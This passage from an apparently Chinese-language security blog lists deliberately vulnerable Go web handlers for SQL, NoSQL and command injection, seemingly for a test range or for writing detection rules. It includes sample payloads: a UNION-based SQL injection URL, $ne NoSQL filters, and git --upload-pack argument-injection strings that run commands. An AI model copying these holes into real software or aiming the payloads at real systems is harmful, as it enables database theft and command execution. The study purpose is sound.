class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(output)</span><br><span class="line">	<span class="comment">//db := sqlx.DB&#123;&#125;</span></span><br><span class="line">	<span class="comment">//untrusted := getUntrustedString()</span></span><br><span class="line">	<span class="comment">//db.Select(nil, untrusted)</span></span><br><span class="line">	<span class="comment">//db.Get(nil, untrusted)</span></span><br><span class="line">	<span class="comment">//db.MustExec(untrusted)</span></span><br><span class="line">	<span class="comment">//db.Queryx(untrusted)</span></span><br><span class="line">	<span class="comment">//db.NamedExec(untrusted, nil)</span></span><br><span class="line">	<span class="comment">//db.NamedQuery(untrusted, nil)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="github-com-gogf-gf"><a href="#github-com-gogf-gf" class="headerlink" title="github.com&#x2F;gogf&#x2F;gf"></a>github.com&#x2F;gogf&#x2F;gf</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//go:generate depstubber -vendor github.com/gogf/gf/frame/g &quot;&quot; DB</span></span><br><span class="line"><span class="comment">//go:generate depstubber -vendor github.com/gogf/gf/database/gdb DB,Core,TX &quot;&quot;</span></span><br></pre></td></tr></table></figure>





<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1:233/sqlInjection/generator/vuln/gf?username=admin&#x27;%20UNION%20ALL%20SELECT%20CONCAT(0x716a767671%2CIFNULL(CAST(CURRENT_USER()%20AS%20CHAR)%2C0x20)%2C0x717a6b6271)%2CNULL%2CNULL--%20-</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SqlInjectionVuln8Controller)</span></span> Get() &#123;</span><br><span class="line">	username := c.GetString(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">	query := fmt.Sprintf(<span class="string">&quot;SELECT * FROM user WHERE username = &#x27;%s&#x27;&quot;</span>, username)</span><br><span class="line"></span><br><span class="line">	result, err := g.DB().Query(query)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> result.Close()</span><br><span class="line">	<span class="keyword">for</span> result.Next() &#123;</span><br><span class="line">		<span class="keyword">var</span> id <span class="type">int</span></span><br><span class="line">		<span class="keyword">var</span> username, password <span class="type">string</span></span><br><span class="line">		<span class="keyword">if</span> err := result.Scan(&amp;id, &amp;username, &amp;password); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">		users := Users&#123;</span><br><span class="line">			ID:       id,</span><br><span class="line">			Username: username,</span><br><span class="line">			Password: password,</span><br><span class="line">		&#125;</span><br><span class="line">		output, err := json.Marshal(users)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">		c.Ctx.ResponseWriter.Write(output)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//func gogfCoreTest(sql string, c *gdb.Core) &#123;</span></span><br><span class="line">	<span class="comment">//	c.Exec(sql, nil)               // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.GetAll(sql, nil)             // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.GetArray(sql, nil)           // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.GetCount(sql, nil)           // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.GetOne(sql, nil)             // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.GetValue(sql, nil)           // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.Prepare(sql, true)           // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.Query(sql, nil)              // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.Raw(sql, nil)                // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.GetScan(nil, sql, nil)       // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.GetStruct(nil, sql, nil)     // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.GetStructs(nil, sql, nil)    // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.DoCommit(nil, nil, sql, nil) // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.DoExec(nil, nil, sql, nil)   // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.DoGetAll(nil, nil, sql, nil) // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.DoQuery(nil, nil, sql, nil)  // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//	c.DoPrepare(nil, nil, sql)     // $ querystring=sql</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="NoSql注入"><a href="#NoSql注入" class="headerlink" title="NoSql注入"></a>NoSql注入</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//go:generate depstubber -vendor go.mongodb.org/mongo-driver/bson/primitive D</span></span><br><span class="line"><span class="comment">//go:generate depstubber -vendor go.mongodb.org/mongo-driver/mongo Collection,Pipeline</span></span><br><span class="line"><span class="comment">//go:generate depstubber -vendor  gopkg.in/couchbase/gocb.v1 Bucket,Cluster</span></span><br><span class="line"><span class="comment">//go:generate depstubber -vendor  github.com/couchbase/gocb/v2 Cluster,Scope</span></span><br></pre></td></tr></table></figure>



<p>use mydb</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">db.users.insertOne(&#123;</span><br><span class="line">    <span class="string">&quot;_id&quot;</span>: ObjectId(<span class="string">&quot;62416d0404812dbd7c2320b8&quot;</span>),</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;user123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;password123&quot;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://docs.fluidattacks.com/criteria/fixes/go/106/#compliant-code">https://docs.fluidattacks.com/criteria/fixes/go/106/#compliant-code</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *NoSqlInjectionVulnController)</span></span> Get() &#123;</span><br><span class="line">	username := <span class="string">&quot;12123&quot;</span></span><br><span class="line">	password := <span class="string">&quot;12123&quot;</span></span><br><span class="line"></span><br><span class="line">	clientOptions := options.Client().ApplyURI(<span class="string">&quot;mongodb://localhost:27017&quot;</span>)</span><br><span class="line">	client, err := mongo.Connect(context.Background(), clientOptions)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> client.Disconnect(context.Background())</span><br><span class="line"></span><br><span class="line">	database := client.Database(<span class="string">&quot;mydb&quot;</span>)</span><br><span class="line">	collection := database.Collection(<span class="string">&quot;users&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 模拟恶意用户输入</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 攻击利用的恶意输入，尝试进行 NoSQL 注入</span></span><br><span class="line">	filter := bson.M&#123;</span><br><span class="line">		<span class="string">&quot;username&quot;</span>: bson.M&#123;<span class="string">&quot;$ne&quot;</span>: username&#125;,</span><br><span class="line">		<span class="string">&quot;password&quot;</span>: bson.M&#123;<span class="string">&quot;$ne&quot;</span>: password&#125;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 执行恶意构造的查询</span></span><br><span class="line">	cursor, err := collection.Find(context.Background(), filter)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> cursor.Close(context.Background())</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> results []bson.M</span><br><span class="line">	<span class="keyword">for</span> cursor.Next(context.Background()) &#123;</span><br><span class="line">		<span class="keyword">var</span> result bson.M</span><br><span class="line">		err := cursor.Decode(&amp;result)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line">		results = <span class="built_in">append</span>(results, result)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(results) == <span class="number">0</span> &#123;</span><br><span class="line">		c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(<span class="string">&quot;No results found for the given username and password&quot;</span>))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Results found:&quot;</span>)</span><br><span class="line">		<span class="keyword">for</span> _, res := <span class="keyword">range</span> results &#123;</span><br><span class="line">			resultString := fmt.Sprintf(<span class="string">&quot;%v\n&quot;</span>, res)</span><br><span class="line">			c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(resultString))</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;go.mongodb.org/mongo-driver/bson&quot;</span></span><br><span class="line">	<span class="string">&quot;go.mongodb.org/mongo-driver/mongo&quot;</span></span><br><span class="line">	<span class="string">&quot;go.mongodb.org/mongo-driver/mongo/options&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	client, err := mongo.NewClient(options.Client().ApplyURI(<span class="string">&quot;mongodb://localhost:27017&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = client.Connect(context.Background())</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	router := gin.Default()</span><br><span class="line"></span><br><span class="line">	router.POST(<span class="string">&quot;/users&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		<span class="keyword">var</span> query bson.M</span><br><span class="line">		<span class="keyword">if</span> err := c.ShouldBindJSON(&amp;query); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		collection := client.Database(<span class="string">&quot;mydb&quot;</span>).Collection(<span class="string">&quot;users&quot;</span>)</span><br><span class="line">		log.Println(query)</span><br><span class="line">		cursor, err := collection.Find(context.Background(), query)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">var</span> results []bson.M</span><br><span class="line">		<span class="keyword">if</span> err = cursor.All(context.Background(), &amp;results); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		c.JSON(http.StatusOK, results)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	router.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p>对于命令注入，Golang引擎原生支持识别os&#x2F;exec相关的函数和结构体，包括exec.Command，exec.CommandContext以及相关实际执行函数CombinedOutput&#x2F;Output&#x2F;Run&#x2F;Start。</p>
<table>
<thead>
<tr>
<th><strong>package</strong></th>
<th><strong>执行函数</strong></th>
</tr>
</thead>
<tbody><tr>
<td>os&#x2F;exec</td>
<td>CombinedOutput,Output,Run,Start</td>
</tr>
</tbody></table>
<h2 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *CommandInjectVuln1Controller)</span></span> Get() &#123;</span><br><span class="line">    dir := c.GetString(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line">    input := fmt.Sprintf(<span class="string">&quot;ls %s&quot;</span>, dir)</span><br><span class="line">    cmd := exec.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, input)</span><br><span class="line">    out, err := cmd.CombinedOutput()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    c.Ctx.ResponseWriter.Write(out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h2 id="Git参数注入"><a href="#Git参数注入" class="headerlink" title="Git参数注入"></a>Git参数注入</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/caiqiiqi/article/details/101782114">git参数注入_cve-2017-8386-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html">https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html</a></p>
<p><a target="_blank" rel="noopener" href="https://staaldraad.github.io/post/2018-06-03-cve-2018-11235-git-rce/">https://staaldraad.github.io/post/2018-06-03-cve-2018-11235-git-rce/</a></p>
<p><a target="_blank" rel="noopener" href="https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/">https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/</a></p>
<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/288704">https://hackerone.com/reports/288704</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2012711">https://cloud.tencent.com/developer/article/2012711</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.nsfocus.net/git-ssh-cve-2017-1000117/">https://blog.nsfocus.net/git-ssh-cve-2017-1000117/</a></p>
<p>可以看看</p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7160219769525223460">https://juejin.cn/post/7160219769525223460</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /commandInject/vuln/git?repoUrl=--upload-pack=$(open /)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *CommandInjectVuln3Controller)</span></span> Get() &#123;</span><br><span class="line">    repoUrl := c.GetString(<span class="string">&quot;repoUrl&quot;</span>, <span class="string">&quot;--upload-pack=$&#123;touch /tmp/pwnned&#125;&quot;</span>)</span><br><span class="line">    out, err := exec.Command(<span class="string">&quot;git&quot;</span>, <span class="string">&quot;ls-remote&quot;</span>, repoUrl, <span class="string">&quot;refs/heads/main&quot;</span>).CombinedOutput()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    c.Ctx.ResponseWriter.Write(out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// git ls-remote -h --upload-pack=calc.exe HEAD</span><br><span class="line">// git grep --open-files-in-pager=calc.exe master</span><br><span class="line">// docker build &quot;git@g.com/a/b#--upload-pack=sleep 5;:&quot;</span><br><span class="line">// git clone --recurse-submodules https://github.com/staaldraad/demosub.git</span><br><span class="line">// git fetch origin --upload-pack=&quot;touch HELLO2&quot; // git init first or in a git project</span><br><span class="line">// git pull origin --upload-pack=&quot;touch HELLO3&quot; // git init first or in a git project</span><br></pre></td></tr></table></figure>





<h2 id="os-StartProcess"><a href="#os-StartProcess" class="headerlink" title="os.StartProcess"></a>os.StartProcess</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">(args ...<span class="type">string</span>)</span></span> (p *os.Process, err <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> args[<span class="number">0</span>], err = exec.LookPath(args[<span class="number">0</span>]); err == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> procAttr os.ProcAttr</span><br><span class="line">        procAttr.Files = []*os.File&#123;os.Stdin,</span><br><span class="line">                                    os.Stdout, os.Stderr&#125;</span><br><span class="line">        p, err := os.StartProcess(args[<span class="number">0</span>], args, &amp;procAttr)</span><br><span class="line">        <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> p, <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> proc, err := Start(<span class="string">&quot;ping&quot;</span>, <span class="string">&quot;-c 3&quot;</span>, <span class="string">&quot;www.google.com&quot;</span>); err == <span class="literal">nil</span> &#123;</span><br><span class="line">        proc.Wait()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> proc, err := Start(<span class="string">&quot;zsh&quot;</span>); err == <span class="literal">nil</span> &#123;</span><br><span class="line">        proc.Wait()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="session-CombinedOutput"><a href="#session-CombinedOutput" class="headerlink" title="session.CombinedOutput"></a>session.CombinedOutput</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// golang.org/x/crypto/ssh</span></span><br><span class="line"><span class="comment">// /CommandInject/vuln/ssh</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *CommandInjectVuln5Controller)</span></span> Get() &#123;</span><br><span class="line">	config := &amp;ssh.ClientConfig&#123;</span><br><span class="line">		User: <span class="string">&quot;root&quot;</span>,</span><br><span class="line">		Auth: []ssh.AuthMethod&#123;</span><br><span class="line">			ssh.Password(<span class="string">&quot;&quot;</span>),</span><br><span class="line">		&#125;,</span><br><span class="line">		HostKeyCallback: ssh.InsecureIgnoreHostKey(),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 连接本地 SSH 服务器</span></span><br><span class="line">	client, err := ssh.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:22&quot;</span>, config)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;Failed to dial: %s&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> client.Close()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建新会话</span></span><br><span class="line">	session, err := client.NewSession()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;Failed to create session: %s&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> session.Close()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 执行本地命令</span></span><br><span class="line">	command := <span class="string">&quot;ls /&quot;</span></span><br><span class="line">	output, err := session.CombinedOutput(command)</span><br><span class="line">	<span class="comment">//session.Output(command)</span></span><br><span class="line">	<span class="comment">//session.Run(command)</span></span><br><span class="line">	<span class="comment">//session.Start(command)</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;Failed to run command: %s&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(output)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="sh-Command"><a href="#sh-Command" class="headerlink" title="sh.Command"></a>sh.Command</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// github.com/codeskyblue/go-sh</span></span><br><span class="line"><span class="comment">// /CommandInject/vuln/sh?dir=open /</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *CommandInjectVuln6Controller)</span></span> Get() &#123;</span><br><span class="line">	shellCommand := c.GetString(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line">	output, err := sh.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, shellCommand).Output()</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;Command output:&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="type">string</span>(output))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建交互式会话并执行 shell 命令</span></span><br><span class="line">	session := sh.NewSession()</span><br><span class="line">	session.ShowCMD = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">	err = session.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, shellCommand).Run()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Error executing shell command in interactive session:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





